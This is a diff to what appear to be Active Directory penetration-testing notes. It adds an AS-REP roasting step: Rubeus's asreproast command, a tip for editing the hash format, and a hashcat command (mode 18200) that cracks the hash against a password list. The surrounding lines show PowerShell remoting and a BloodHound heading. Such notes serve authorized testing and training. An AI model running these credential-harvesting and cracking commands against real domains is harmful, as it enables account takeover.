@@ -160,6 +160,17 @@ $cred = New-Object System.Management.Automation.PSCredential ("<username>", $pas
 Enter-PSSession -ComputerName <computer_name> -Credential $cred
 ```
 
+rubeus asreproast
+
+```powershell
+.\rubeus.exe asreproast
+
+# modify hash insert $23 after $krb5asrep 
+# $krb5asrep$23$......
+
+.\hashcat.exe -a 0 -m 18200 .\hash .\Pass.txt
+```
+
 ### :open_file_folder: BloodHound
 
 :bangbang: [Edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html): relationship between nodes, direct of attack
